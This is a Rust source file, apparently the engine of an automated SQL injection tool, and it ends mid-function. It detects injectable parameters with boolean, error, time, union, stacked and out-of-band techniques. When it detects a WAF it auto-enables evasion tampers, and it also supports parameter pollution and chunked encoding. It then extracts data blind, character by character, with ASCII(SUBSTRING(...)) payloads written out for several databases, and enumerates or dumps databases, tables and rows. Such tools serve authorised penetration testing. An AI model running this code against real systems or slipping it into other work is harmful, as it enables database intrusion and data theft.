#![deny(unsafe_code)]

use crate::{
    detection::{baseline, confirmation},
    http::client::{HttpClient, RequestSpec},
    session::{
        scrubber::Scrubber,
        state::{Finding, SessionState, TechniqueKind},
    },
    target::{
        markers::MarkerSet,
        parameters::{ParameterLocation, TargetParameter},
        raw_request::RawRequest,
        url::TargetUrl,
    },
    techniques::{
        boolean::{detector::BooleanDetector, payloads::boolean_payloads_for},
        error::detector::ErrorDetector,
        oob::{
            detector::OobDetector,
            payloads::{is_valid_oob_domain, new_token, oob_payloads_for},
        },
        request_tamper::{hpp_body_str, hpp_query_url, should_apply_chunked},
        stacked::{detector::StackedDetector, payloads::stacked_payloads_for},
        tamper::{Tamper, apply_tampers, tamper_transformation_sets},
        time::{detector::TimeDetector, payloads::time_payload_for},
        union::{detector::UnionDetector, payloads::union_payloads_for},
    },
};
use futures::StreamExt as _;
use http::Method;
use indicatif::{ProgressBar, ProgressStyle};
use std::{sync::Arc, time::Instant};
use tokio::sync::RwLock;
use tokio_util::sync::CancellationToken;
use tracing::{info, warn};

#[derive(Debug, Clone, PartialEq, Eq)]
#[non_exhaustive]
pub enum EngineState {
    Parse,
    Baseline,
    Detection,
    Fingerprint,
    Extraction,
    Enumeration,
    Done,
}

#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct EngineConfig {
    pub threads: usize,
    pub techniques: Vec<String>,
    pub tampers: Vec<crate::techniques::tamper::Tamper>,
    pub oob_domain: Option<String>,
    pub oob_poll_url: Option<String>,
    pub oob_wait_secs: u64,
    pub hpp: bool,
    pub chunked: bool,
    pub allow_private: bool,
    pub no_redact: bool,
    pub extract: bool,
    pub dbs: bool,
    pub tables: bool,
    pub columns: bool,
    pub dump: bool,
    pub db: Option<String>,
    pub table: Option<String>,
    pub column: Option<String>,
    pub start: Option<usize>,
    pub stop: Option<usize>,
    pub count: bool,
}

/// Request-level evasion options, threaded alongside string [`Tamper`]s.
///
/// `Copy` so detection workers and extraction oracles can capture it cheaply.
#[derive(Debug, Clone, Copy, Default)]
#[non_exhaustive]
pub struct ProbeOpts {
    /// HTTP Parameter Pollution: duplicate `?id=1&id=<PAYLOAD>` (Query/Body).
    pub hpp: bool,
    /// Chunked transfer: `Transfer-Encoding: chunked` streaming body (Body only).
    pub chunked: bool,
}

impl ProbeOpts {
    #[must_use]
    pub const fn new(hpp: bool, chunked: bool) -> Self {
        Self { hpp, chunked }
    }

    #[must_use]
    pub const fn is_active(self) -> bool {
        self.hpp || self.chunked
    }

    /// Short evidence suffix, e.g. `" hpp=true chunked=false"`, or `""` when inactive.
    #[must_use]
    pub fn evidence_suffix(self) -> String {
        if !self.is_active() {
            return String::new();
        }
        format!(" hpp={} chunked={}", self.hpp, self.chunked)
    }
}

impl Default for EngineConfig {
    fn default() -> Self {
        Self {
            threads: 5,
            techniques: vec![
                "boolean".to_owned(),
                "time".to_owned(),
                "error".to_owned(),
                "union".to_owned(),
            ],
            tampers: Vec::new(),
            oob_domain: None,
            oob_poll_url: None,
            oob_wait_secs: 5,
            hpp: false,
            chunked: false,
            allow_private: false,
            no_redact: false,
            extract: false,
            dbs: false,
            tables: false,
            columns: false,
            dump: false,
            db: None,
            table: None,
            column: None,
            start: None,
            stop: None,
            count: false,
        }
    }
}

#[derive(Debug)]
#[non_exhaustive]
pub struct Engine {
    config: EngineConfig,
    client: HttpClient,
    state: Arc<RwLock<SessionState>>,
    cancel: CancellationToken,
    scrubber: Scrubber,
}

impl Engine {
    #[must_use]
    pub fn new(config: EngineConfig, client: HttpClient, cancel: CancellationToken) -> Self {
        let scrubber = Scrubber::new(config.no_redact);
        Self {
            config,
            client,
            state: Arc::new(RwLock::new(SessionState::new())),
            cancel,
            scrubber,
        }
    }

    #[must_use]
    pub fn state_handle(&self) -> Arc<RwLock<SessionState>> {
        Arc::clone(&self.state)
    }

    pub async fn run(&self, target_str: &str) -> anyhow::Result<EngineState> {
        self.run_internal(target_str, None).await
    }

    pub async fn run_candidate(
        &self,
        candidate: &crate::recon::ParameterCandidate,
    ) -> anyhow::Result<EngineState> {
        self.run_internal(candidate.url.as_str(), Some(candidate))
            .await
    }

    async fn run_internal(
        &self,
        target_str: &str,
        candidate: Option<&crate::recon::ParameterCandidate>,
    ) -> anyhow::Result<EngineState> {
        let mut current = EngineState::Parse;
        info!(target=%self.scrubber.scrub(target_str), state=?current, "engine start");

        // Parse
        let target = TargetUrl::parse(target_str, self.config.allow_private)
            .map_err(|e| anyhow::anyhow!("parse error: {e}"))?;
        current = EngineState::Baseline;
        info!(state=?current, "phase baseline");

        if self.cancel.is_cancelled() {
            return Ok(EngineState::Done);
        }

        let raw_request = candidate.map(crate::recon::ParameterCandidate::raw_request);
        let candidate_param = candidate.map(crate::recon::ParameterCandidate::target_parameter);

        // Baseline: 3-5 requests
        let pb = ProgressBar::new_spinner();
        pb.set_style(
            ProgressStyle::default_spinner()
                .template("{spinner} {msg}")
                .unwrap_or_else(|_| ProgressStyle::default_spinner()),
        );
        pb.set_message("collecting baseline…");
        pb.enable_steady_tick(std::time::Duration::from_millis(80));

        let mut samples = Vec::new();
        for _ in 0..3 {
            if self.cancel.is_cancelled() {
                break;
            }
            let start = Instant::now();
            let spec = raw_request.as_ref().map_or_else(
                || RequestSpec::get(target.as_str().to_owned()),
                |raw| request_spec_from_raw(&target, raw),
            );
            let resp = self.client.send_with_retry(spec, &self.cancel).await;
            let elapsed = start.elapsed();
            match resp {
                Ok(r) => {
                    let status = r.status().as_u16();
                    let body = match r.bytes().await {
                        Ok(b) => b.to_vec(),
                        Err(e) => {
                            warn!(error=%e, "baseline body read failed");
                            Vec::new()
                        }
                    };
                    samples.push(baseline::Sample {
                        status,
                        body,
                        duration: elapsed,
                    });
                    self.state.write().await.increment_requests();
                }
                Err(e) => warn!(error=%e, "baseline request failed"),
            }
        }
        if samples.is_empty() {
            pb.finish_with_message("baseline failed");
            if self.cancel.is_cancelled() {
                return Ok(EngineState::Done);
            }
            anyhow::bail!("baseline failed: no successful responses from target after 3 attempts");
        }
        pb.finish_with_message("baseline done");
        let baseline = baseline::Baseline::new(samples);
        if baseline.is_waf_blocked() {
            warn!("possible WAF detected (repeated 403/406)");
        }
        // Effective tampers: if WAF blocked and user gave none, auto-enable light bypass
        let effective_tampers: Vec<Tamper> = if baseline.is_waf_blocked()
            && self.config.tampers.is_empty()
        {
            info!(
                "WAF suspected and no --tamper given — auto-enabling space2comment for detection"
            );
            vec![Tamper::Space2Comment]
        } else {
            self.config.tampers.clone()
        };
        if !effective_tampers.is_empty() {
            info!(
                tampers=?effective_tampers.iter().map(|t| t.name()).collect::<Vec<_>>(),
                "WAF tampers active"
            );
        }
        let effective_opts = ProbeOpts::new(self.config.hpp, self.config.chunked);
        if effective_opts.is_active() {
            info!(hpp=%effective_opts.hpp, chunked=%effective_opts.chunked, "request-level tampers active");
        }
        current = EngineState::Detection;
        info!(state=?current, "phase detection");

        // Detection per parameter — bounded concurrency via buffer_unordered
        let marker_set = MarkerSet::detect(target_str);
        let mut params = Vec::new();
        // Marker mode: synthetic params, but also test real query params (don't ignore them)
        if marker_set.asterisk {
            params.push(TargetParameter::new(
                "marker_asterisk",
                ParameterLocation::Query,
                "*",
            ));
        }
        if marker_set.section {
            params.push(TargetParameter::new(
                "marker_section",
                ParameterLocation::Query,
                "§",
            ));
        }
        if marker_set.double_brace {
            params.push(TargetParameter::new(
                "marker_brace",
                ParameterLocation::Query,
                "{{}}",
            ));
        }
        // Always include real query params even when markers present (fixes #6)
        params.extend(crate::target::parameters::collect_from_url_query(&target));
        let to_test: Vec<TargetParameter> = if let Some(param) = candidate_param {
            vec![param]
        } else if params.is_empty() {
            vec![TargetParameter::new("id", ParameterLocation::Query, "1")]
        } else {
            params
        };

        let pb2 = Arc::new(ProgressBar::new(to_test.len() as u64));
        pb2.set_style(
            ProgressStyle::default_bar()
                .template("{bar:40} {pos}/{len} {msg}")
                .unwrap_or_else(|_| ProgressStyle::default_bar()),
        );

        // Bounded concurrent testing per parameter (respects --threads)
        let concurrency = self.config.threads.clamp(1, 32);
        let target_str_owned = target_str.to_owned();
        let baseline_clone = baseline.clone();
        let target_clone = target.clone();
        let marker_set_clone = marker_set.clone();
        let raw_request = Arc::new(raw_request);
        let effective_tampers_arc = Arc::new(effective_tampers.clone());

        let stream = futures::stream::iter(to_test)
            .map(|param| {
                let target = target_clone.clone();
                let target_str = target_str_owned.clone();
                let baseline = baseline_clone.clone();
                let marker_set = marker_set_clone.clone();
                let client = self.client.clone();
                let state = Arc::clone(&self.state);
                let cancel = self.cancel.clone();
                let config = self.config.clone();
                let tampers = Arc::clone(&effective_tampers_arc);
                let pb2 = Arc::clone(&pb2);
                let raw_request = Arc::clone(&raw_request);
                async move {
                    if cancel.is_cancelled() {
                        pb2.inc(1);
                        return;
                    }
                    let opts = ProbeOpts::new(config.hpp, config.chunked);
                    // Boolean with confirmation (3 trials)
                    if config
                        .techniques
                        .iter()
                        .any(|t| t == "boolean" || t == "all")
                    {
                        test_boolean_bounded(
                            &client,
                            &state,
                            &cancel,
                            &target,
                            &target_str,
                            &param,
                            &baseline,
                            &marker_set,
                            raw_request.as_ref().as_ref(),
                            &tampers,
                            opts,
                        )
                        .await;
                    }
                    if config.techniques.iter().any(|t| t == "error" || t == "all") {
                        test_error_bounded(
                            &client,
                            &state,
                            &cancel,
                            &target,
                            &target_str,
                            &param,
                            &marker_set,
                            raw_request.as_ref().as_ref(),
                            &tampers,
                            opts,
                        )
                        .await;
                    }
                    if config.techniques.iter().any(|t| t == "time" || t == "all") {
                        test_time_bounded(
                            &client,
                            &state,
                            &cancel,
                            &target,
                            &target_str,
                            &param,
                            &baseline,
                            &marker_set,
                            raw_request.as_ref().as_ref(),
                            &tampers,
                            opts,
                        )
                        .await;
                    }
                    if config.techniques.iter().any(|t| t == "union" || t == "all") {
                        test_union_bounded(
                            &client,
                            &state,
                            &cancel,
                            &target,
                            &target_str,
                            &param,
                            &baseline,
                            &marker_set,
                            raw_request.as_ref().as_ref(),
                            &tampers,
                            opts,
                        )
                        .await;
                    }
                    if config
                        .techniques
                        .iter()
                        .any(|t| t == "stacked" || t == "all")
                    {
                        test_stacked_bounded(
                            &client,
                            &state,
                            &cancel,
                            &target,
                            &target_str,
                            &param,
                            &baseline,
                            &marker_set,
                            raw_request.as_ref().as_ref(),
                            &tampers,
                            opts,
                        )
                        .await;
                    }
                    if config.techniques.iter().any(|t| t == "oob" || t == "all") {
                        test_oob_bounded(
                            &client,
                            &state,
                            &cancel,
                            &target,
                            &target_str,
                            &param,
                            &baseline,
                            &marker_set,
                            raw_request.as_ref().as_ref(),
                            &tampers,
                            opts,
                            config.oob_domain.clone(),
                            config.oob_poll_url.clone(),
                            config.oob_wait_secs,
                        )
                        .await;
                    }
                    pb2.inc(1);
                }
            })
            .buffer_unordered(concurrency);

        stream.collect::<Vec<()>>().await;
        pb2.finish_with_message("detection done");
        current = EngineState::Fingerprint;
        info!(state=?current, "phase fingerprint");

        // Fingerprint: passive guess from error findings + banner regex, then fill missing dbms for boolean/time
        {
            let findings_snapshot = self.state.read().await.findings().to_vec();
            if let Some(kind) = crate::dbms::fingerprint::guess_from_findings(&findings_snapshot) {
                let mut st = self.state.write().await;
                st.fill_missing_dbms(kind.clone());
                info!(dbms=%kind, "fingerprint guessed from findings");
            } else if !findings_snapshot.is_empty() {
                // Try banner extraction from evidences
                for f in &findings_snapshot {
                    if let Some((kind, ver)) =
                        crate::dbms::fingerprint::extract_banner_version(&f.evidence)
                    {
                        let mut st = self.state.write().await;
                        st.fill_missing_dbms(kind.clone());
                        info!(dbms=%kind, version=%ver, "fingerprint banner detected");
                        break;
                    }
                }
            }
        }

        if self.config.extract {
            current = EngineState::Extraction;
            info!(state=?current, "phase extraction — inference (opt-in)");

            // Pick first finding's param as injection point for extraction
            let (first_param, target_for_extract) = {
                let st = self.state.read().await;
                let f = st.findings().first().cloned();
                drop(st);
                if let Some(finding) = f {
                    // Recover param from finding.parameter "name@location" (e.g., "id@query", "user@body", "X-Header@header:X-Header")
                    let (name, loc_str) = match finding.parameter.split_once('@') {
                        Some((n, l)) => (n.to_owned(), l.to_owned()),
                        None => (finding.parameter.clone(), "query".to_owned()),
                    };
                    let location = if loc_str == "query" {
                        ParameterLocation::Query
                    } else if loc_str == "body" {
                        ParameterLocation::Body
                    } else if loc_str == "cookie" {
                        ParameterLocation::Cookie
                    } else if let Some(h) = loc_str.strip_prefix("header:") {
                        ParameterLocation::Header(h.to_owned())
                    } else {
                        // Fallback: treat any unknown as Query, but preserve marker handling via name prefix
                        ParameterLocation::Query
                    };
                    (TargetParameter::new(name, location, "1"), target.clone())
                } else {
                    // fallback synthetic
                    (
                        TargetParameter::new("id", ParameterLocation::Query, "1"),
                        target.clone(),
                    )
                }
            };

            // Determine DBMS for extraction query
            let dbms_kind = {
                let snap = self.state.read().await.findings().to_vec();
                crate::dbms::fingerprint::guess_from_findings(&snap)
                    .unwrap_or(crate::dbms::DbmsKind::MySql)
            };
            let version_query = match dbms_kind {
                crate::dbms::DbmsKind::MySql => "SELECT @@version",
                crate::dbms::DbmsKind::Postgres => "SELECT version()",
                crate::dbms::DbmsKind::MsSql => "SELECT @@version",
                crate::dbms::DbmsKind::Oracle => "SELECT banner FROM v$version WHERE ROWNUM=1",
                crate::dbms::DbmsKind::Unknown => "SELECT @@version",
            };

            // Build oracle: ASCII(SUBSTRING((query), pos+1, 1)) >= mid
            let baseline_body = baseline.representative_body_str();
            let baseline_mean = baseline.mean_ms;
            let client_clone = self.client.clone();
            let state_clone = Arc::clone(&self.state);
            let cancel_clone = self.cancel.clone();
            let target_str_clone = target_str.to_owned();
            let target_clone2 = target_for_extract.clone();
            let first_param_clone = first_param.clone();
            let marker_set_clone = marker_set.clone();
            let raw_request_clone = raw_request.as_ref().clone();

            // First, infer length via LENGTH(query) if possible (try lengths 1..64)
            // Use retry per guess to mitigate single WAF/network hiccup; require 2 trials.
            let mut inferred_len: usize = 0;
            for len_guess in 1..=64usize {
                if cancel_clone.is_cancelled() {
                    break;
                }
                let base_payload = match dbms_kind {
                    crate::dbms::DbmsKind::MySql => {
                        format!("' AND LENGTH(({version_query}))>={len_guess} -- -")
                    }
                    crate::dbms::DbmsKind::Postgres => {
                        format!("' AND LENGTH(({version_query})::text)>={len_guess} --")
                    }
                    crate::dbms::DbmsKind::MsSql => {
                        format!("' AND LEN(({version_query}))>={len_guess} --")
                    }
                    crate::dbms::DbmsKind::Oracle => {
                        format!("' AND LENGTH(({version_query}))>={len_guess} --")
                    }
                    crate::dbms::DbmsKind::Unknown => {
                        format!("' AND LENGTH(({version_query}))>={len_guess} -- -")
                    }
                };
                let payload = apply_tampers(&base_payload, &effective_tampers);
                // Retry logic: require 2 probes, treat as true only if majority true
                let mut true_count = 0usize;
                for _ in 0..2 {
                    let spec = build_injection_spec_with_raw(
                        &target_clone2,
                        &target_str_clone,
                        &first_param_clone,
                        &payload,
                        &marker_set_clone,
                        raw_request_clone.as_ref(),
                        effective_opts,
                    );
                    let start = Instant::now();
                    let resp = client_clone.send_with_retry(spec, &cancel_clone).await;
                    let ms = start.elapsed().as_secs_f64() * 1000.0;
                    state_clone.write().await.increment_requests();
                    let body = match resp {
                        Ok(r) => r.text().await.unwrap_or_default(),
                        Err(_) => String::new(),
                    };
                    let diff = crate::detection::response_diff::diff_against_baseline(
                        &baseline_body,
                        &body,
                        baseline_mean,
                        ms,
                        100.0,
                    );
                    if diff.confidence < 0.4 {
                        true_count += 1;
                    }
                    // small jitter between retries
                    if cancel_clone.is_cancelled() {
                        break;
                    }
                }
                let is_true = true_count >= 1; // at least one true (tolerate single hiccup)
                // If we saw 0 true after 2 trials, length guess exceeded
                if !is_true {
                    inferred_len = len_guess - 1;
                    break;
                }
                if len_guess == 64 {
                    inferred_len = 64;
                }
            }
            if inferred_len == 0 {
                warn!("length inference failed, falling back to 16");
                inferred_len = 16; // fallback with warning
            }
            info!(len=%inferred_len, "inferred version length");

            // Now extract string char by char via binary search oracle
            let engine = crate::extraction::engine::ExtractionEngine::new(
                crate::extraction::engine::ExtractionConfig::default(),
            );
            let dbms_for_closure = dbms_kind.clone();
            let version_query_owned = version_query.to_owned();
            let baseline_body2 = baseline_body.clone();
            let baseline_mean2 = baseline_mean;
            let client_for_oracle = client_clone.clone();
            let state_for_oracle = state_clone.clone();
            let cancel_for_oracle = cancel_clone.clone();
            let target_for_oracle = target_clone2.clone();
            let param_for_oracle = first_param_clone.clone();
            let marker_for_oracle = marker_set_clone.clone();
            let raw_for_oracle = raw_request.as_ref().clone();

            let target_str_for_oracle = target_str_clone.clone();
            let tampers_for_oracle = effective_tampers.clone();
            let oracle = move |pos: usize, mid: u8| {
                let client = client_for_oracle.clone();
                let state = state_for_oracle.clone();
                let cancel = cancel_for_oracle.clone();
                let target = target_for_oracle.clone();
                let param = param_for_oracle.clone();
                let marker_set = marker_for_oracle.clone();
                let raw = raw_for_oracle.clone();
                let baseline_body = baseline_body2.clone();
                let version_query = version_query_owned.clone();
                let dbms_kind = dbms_for_closure.clone();
                let target_str = target_str_for_oracle.clone();
                let tampers = tampers_for_oracle.clone();
                let opts = effective_opts;
                async move {
                    // build ASCII(SUBSTRING) >= mid payload
                    let base = match dbms_kind {
                        crate::dbms::DbmsKind::MySql => format!(
                            "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} -- -",
                            pos + 1,
                            mid
                        ),
                        crate::dbms::DbmsKind::Postgres => format!(
                            "' AND ASCII(SUBSTRING(({version_query})::text,{},1))>={} --",
                            pos + 1,
                            mid
                        ),
                        crate::dbms::DbmsKind::MsSql => format!(
                            "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} --",
                            pos + 1,
                            mid
                        ),
                        crate::dbms::DbmsKind::Oracle => format!(
                            "' AND ASCII(SUBSTR(({version_query}),{},1))>={} --",
                            pos + 1,
                            mid
                        ),
                        crate::dbms::DbmsKind::Unknown => format!(
                            "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} -- -",
                            pos + 1,
                            mid
                        ),
                    };
                    let payload = apply_tampers(&base, &tampers);
                    // Use spec-based injection to preserve param location (Query/Body/Header/Cookie) and marker handling
                    let spec = build_injection_spec_with_raw(
                        &target,
                        &target_str,
                        &param,
                        &payload,
                        &marker_set,
                        raw.as_ref(),
                        opts,
                    );
                    let start = Instant::now();
                    let resp = client.send_with_retry(spec, &cancel).await;
                    let ms = start.elapsed().as_secs_f64() * 1000.0;
                    state.write().await.increment_requests();
                    let body = match resp {
                        Ok(r) => r.text().await.unwrap_or_default(),
                        Err(_) => String::new(),
                    };
                    let diff = crate::detection::response_diff::diff_against_baseline(
                        &baseline_body,
                        &body,
                        baseline_mean2,
                        ms,
                        100.0,
                    );
                    // similar => true (>= mid)
                    diff.confidence < 0.4
                }
            };

            let extracted = engine.extract(inferred_len, oracle).await;
            let exposed = {
                use secrecy::ExposeSecret;
                extracted.expose_secret().to_owned()
            };
            info!(extracted=%Scrubber::hash_truncated(&exposed), len=%exposed.len(), "extraction done");
            // scrubbed hash logged, raw stored as SecretString zeroized after report
            self.state.write().await.push_extracted(extracted);
        }

        // Enumeration phase (--dbs, --tables, --columns, --dump, --count)
        let needs_enum = self.config.dbs
            || self.config.tables
            || self.config.columns
            || self.config.dump
            || self.config.count;
        let has_findings_for_enum = !self.state.read().await.findings().is_empty();
        if needs_enum && has_findings_for_enum {
            current = EngineState::Enumeration;
            info!(state=?current, "phase enumeration — dbs/tables/columns/dump");

            // Reuse extraction context
            let (first_param, target_for_extract) = {
                let st = self.state.read().await;
                let f = st.findings().first().cloned();
                drop(st);
                if let Some(finding) = f {
                    let (name, loc_str) = match finding.parameter.split_once('@') {
                        Some((n, l)) => (n.to_owned(), l.to_owned()),
                        None => (finding.parameter.clone(), "query".to_owned()),
                    };
                    let location = if loc_str == "query" {
                        ParameterLocation::Query
                    } else if loc_str == "body" {
                        ParameterLocation::Body
                    } else if loc_str == "cookie" {
                        ParameterLocation::Cookie
                    } else if let Some(h) = loc_str.strip_prefix("header:") {
                        ParameterLocation::Header(h.to_owned())
                    } else {
                        ParameterLocation::Query
                    };
                    (TargetParameter::new(name, location, "1"), target.clone())
                } else {
                    (
                        TargetParameter::new("id", ParameterLocation::Query, "1"),
                        target.clone(),
                    )
                }
            };

            let dbms_kind = {
                let snap = self.state.read().await.findings().to_vec();
                crate::dbms::fingerprint::guess_from_findings(&snap)
                    .unwrap_or(crate::dbms::DbmsKind::MySql)
            };

            let detector = crate::dbms::fingerprint::get_detector(dbms_kind.clone());

            let baseline_body = baseline.representative_body_str();
            let baseline_mean = baseline.mean_ms;
            let client = self.client.clone();
            let state = Arc::clone(&self.state);
            let cancel = self.cancel.clone();
            let target_str = target_str.to_owned();
            let marker_set = marker_set.clone();
            let raw_request_for_enum = raw_request.as_ref().clone();

            let start = self.config.start.unwrap_or(0);
            let stop = self.config.stop.unwrap_or(100);

            if self.config.dbs {
                let query = detector.list_databases_query();
                let extracted = extract_enum_field(
                    &client,
                    &state,
                    &cancel,
                    &target_for_extract,
                    &target_str,
                    &first_param,
                    &marker_set,
                    &baseline_body,
                    baseline_mean,
                    query.clone(),
                    "databases".to_owned(),
                    raw_request_for_enum.as_ref(),
                    &effective_tampers,
                    effective_opts,
                )
                .await;
                if let Some(extracted) = extracted {
                    info!(extracted=%Scrubber::hash_truncated(&extracted), "databases enumerated");
                    self.state
                        .write()
                        .await
                        .push_extracted(secrecy::SecretString::from(extracted));
                }
            }

            let target_db = self.config.db.clone().unwrap_or_default();
            if self.config.tables && !target_db.is_empty() {
                let query = detector.list_tables_query(&target_db);
                let extracted = extract_enum_field(
                    &client,
                    &state,
                    &cancel,
                    &target_for_extract,
                    &target_str,
                    &first_param,
                    &marker_set,
                    &baseline_body,
                    baseline_mean,
                    query.clone(),
                    "tables".to_owned(),
                    raw_request_for_enum.as_ref(),
                    &effective_tampers,
                    effective_opts,
                )
                .await;
                if let Some(extracted) = extracted {
                    info!(extracted=%Scrubber::hash_truncated(&extracted), "tables enumerated for db={}", target_db);
                    self.state
                        .write()
                        .await
                        .push_extracted(secrecy::SecretString::from(extracted));
                }
            }

            let target_table = self.config.table.clone().unwrap_or_default();
            if self.config.columns && !target_db.is_empty() && !target_table.is_empty() {
                let query = detector.list_columns_query(&target_db, &target_table);
                let extracted = extract_enum_field(
                    &client,
                    &state,
                    &cancel,
                    &target_for_extract,
                    &target_str,
                    &first_param,
                    &marker_set,
                    &baseline_body,
                    baseline_mean,
                    query.clone(),
                    "columns".to_owned(),
                    raw_request_for_enum.as_ref(),
                    &effective_tampers,
                    effective_opts,
                )
                .await;
                if let Some(extracted) = extracted {
                    info!(extracted=%Scrubber::hash_truncated(&extracted), "columns enumerated for {}.{}", target_db, target_table);
                    self.state
                        .write()
                        .await
                        .push_extracted(secrecy::SecretString::from(extracted));
                }
            }

            if self.config.dump && !target_db.is_empty() && !target_table.is_empty() {
                let columns: Vec<String> = self
                    .config
                    .column
                    .clone()
                    .map(|c| c.split(',').map(|s| s.trim().to_owned()).collect())
                    .unwrap_or_default();
                let query =
                    detector.dump_table_query(&target_db, &target_table, &columns, start, stop);
                let extracted = extract_enum_field(
                    &client,
                    &state,
                    &cancel,
                    &target_for_extract,
                    &target_str,
                    &first_param,
                    &marker_set,
                    &baseline_body,
                    baseline_mean,
                    query.clone(),
                    "dump".to_owned(),
                    raw_request_for_enum.as_ref(),
                    &effective_tampers,
                    effective_opts,
                )
                .await;
                if let Some(extracted) = extracted {
                    info!(extracted=%Scrubber::hash_truncated(&extracted), "dump extracted for {}.{} rows {}-{}", target_db, target_table, start, stop);
                    self.state
                        .write()
                        .await
                        .push_extracted(secrecy::SecretString::from(extracted));
                }
            }

            if self.config.count && !target_db.is_empty() && !target_table.is_empty() {
                let query = detector.count_rows_query(&target_db, &target_table);
                let extracted = extract_enum_field(
                    &client,
                    &state,
                    &cancel,
                    &target_for_extract,
                    &target_str,
                    &first_param,
                    &marker_set,
                    &baseline_body,
                    baseline_mean,
                    query.clone(),
                    "count".to_owned(),
                    raw_request_for_enum.as_ref(),
                    &effective_tampers,
                    effective_opts,
                )
                .await;
                if let Some(extracted) = extracted {
                    info!(extracted=%Scrubber::hash_truncated(&extracted), "row count for {}.{}", target_db, target_table);
                    self.state
                        .write()
                        .await
                        .push_extracted(secrecy::SecretString::from(extracted));
                }
            }
        } else if needs_enum {
            warn!("enumeration requested but no confirmed vulnerability was found");
        }

        current = EngineState::Done;
        info!(state=?current, requests=self.state.read().await.request_count(), "engine done");
        Ok(current)
    }

    #[allow(dead_code)]
    async fn test_boolean(
        &self,
        target: &TargetUrl,
        param: &TargetParameter,
        baseline: &baseline::Baseline,
    ) {
        let payloads = boolean_payloads_for(None);
        let detector = BooleanDetector::new();
        for p in payloads.iter().take(2) {
            if self.cancel.is_cancelled() {
                break;
            }
            // craft urls with payloads
            let true_url = inject_param(target, param, &p.true_payload);
            let false_url = inject_param(target, param, &p.false_payload);

            let (true_body, true_ms) =
                fetch_body_and_time(&self.client, &true_url, &self.state).await;
            let (false_body, false_ms) =
                fetch_body_and_time(&self.client, &false_url, &self.state).await;

            let baseline_body = baseline.representative_body_str();
            let res = detector.evaluate(
                &baseline_body,
                &true_body,
                &false_body,
                baseline.mean_ms,
                true_ms,
                false_ms,
            );
            if res.is_vulnerable && res.confidence > 0.6 {
                let evidence = format!(
                    "boolean true_sim={:.2} false_sim={:.2}",
                    res.true_similarity, res.false_similarity
                );
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Boolean,
                    res.confidence,
                    evidence,
                );
                finding.dbms = None;
                self.state.write().await.push_finding(finding);
                break;
            }
        }
    }

    #[allow(dead_code)]
    async fn test_error(&self, target: &TargetUrl, param: &TargetParameter) {
        let detector = ErrorDetector::new();
        let payloads = crate::techniques::error::payloads::error_payloads_for(None);
        for p in payloads.iter().take(2) {
            if self.cancel.is_cancelled() {
                break;
            }
            let url = inject_param(target, param, &p.payload);
            let (body, _ms) = fetch_body_and_time(&self.client, &url, &self.state).await;
            let r = detector.evaluate(&body);
            if r.is_vulnerable {
                let mut finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Error,
                    r.confidence,
                    format!("error pattern {:?}", r.matched_pattern),
                );
                finding.dbms = Some(p.dbms.clone());
                self.state.write().await.push_finding(finding);
                break;
            }
        }
    }

    #[allow(dead_code)]
    async fn test_time(
        &self,
        target: &TargetUrl,
        param: &TargetParameter,
        baseline: &baseline::Baseline,
    ) {
        let detector = TimeDetector::new(baseline.mean_ms, baseline.stddev_ms);
        let payload = time_payload_for(None, 3.0);
        let url = inject_param(target, param, &payload.payload);
        let (_body, ms) = fetch_body_and_time(&self.client, &url, &self.state).await;
        let r = detector.evaluate(ms, payload.sleep_secs);
        if r.is_vulnerable {
            let finding = Finding::new(
                target.as_str(),
                param.key(),
                TechniqueKind::Time,
                r.confidence,
                format!(
                    "time delay {:.0}ms > threshold {:.0}ms",
                    r.measured_ms,
                    detector.threshold()
                ),
            );
            self.state.write().await.push_finding(finding);
        }
    }
}

fn inject_param(target: &TargetUrl, param: &TargetParameter, payload: &str) -> String {
    // naive: replace query param value
    let mut url = target.inner().clone();
    let mut pairs: Vec<(String, String)> = url
        .query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect();
    let mut found = false;
    for (k, v) in &mut pairs {
        if k == &param.name {
            *v = payload.to_owned();
            found = true;
        }
    }
    if !found {
        pairs.push((param.name.clone(), payload.to_owned()));
    }
    url.query_pairs_mut().clear();
    for (k, v) in pairs {
        url.query_pairs_mut().append_pair(&k, &v);
    }
    url.to_string()
}

#[allow(clippy::collapsible_if)]
fn inject_with_marker(target_str: &str, payload: &str, marker_set: &MarkerSet) -> String {
    let mut s = target_str.to_owned();
    if marker_set.asterisk {
        if s.contains('*') {
            // Replace only first occurrence to avoid over-broad replacement
            if let Some(pos) = s.find('*') {
                s.replace_range(pos..pos + 1, payload);
                return s;
            }
        } else {
            // Handle encoded asterisk %2A (case-insensitive) when URL is percent-encoded
            let lower = s.to_ascii_lowercase();
            if let Some(pos) = lower.find("%2a") {
                s.replace_range(pos..pos + 3, payload);
                return s;
            }
        }
    }
    if marker_set.section {
        // §payload§ -> replace inner
        if let Some(start) = s.find('§')
            && let Some(end) = s[start + '§'.len_utf8()..].find('§')
        {
            let sec_end = start + '§'.len_utf8() + end + '§'.len_utf8();
            s.replace_range(start..sec_end, payload);
            return s;
        }
    }
    if marker_set.double_brace && s.contains("{{") && s.contains("}}") {
        if let Some(start) = s.find("{{")
            && let Some(end) = s[start..].find("}}")
        {
            let brace_end = start + end + "}}".len();
            s.replace_range(start..brace_end, payload);
            return s;
        }
    }
    // fallback: append as query
    if s.contains('?') {
        format!("{s}&injekt={payload}")
    } else {
        format!("{s}?injekt={payload}")
    }
}

#[allow(dead_code)]
fn inject_param_or_marker(
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    payload: &str,
    marker_set: &MarkerSet,
) -> String {
    if marker_set.has_any() && param.name.starts_with("marker_") {
        inject_with_marker(target_str, payload, marker_set)
    } else {
        inject_param(target, param, payload)
    }
}

fn inject_body_param(
    raw: Option<&crate::target::raw_request::RawRequest>,
    param: &TargetParameter,
    payload: &str,
    hpp: bool,
) -> (Method, String, http::HeaderMap) {
    let method = raw
        .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
        .unwrap_or(Method::POST);
    let existing_body = raw.and_then(|r| r.body.as_deref());
    if hpp {
        // HPP: keep original fields, append param=payload as duplicate.
        let body_str = hpp_body_str(existing_body, &param.name, payload);
        let mut headers = http::HeaderMap::new();
        headers.insert(
            http::header::CONTENT_TYPE,
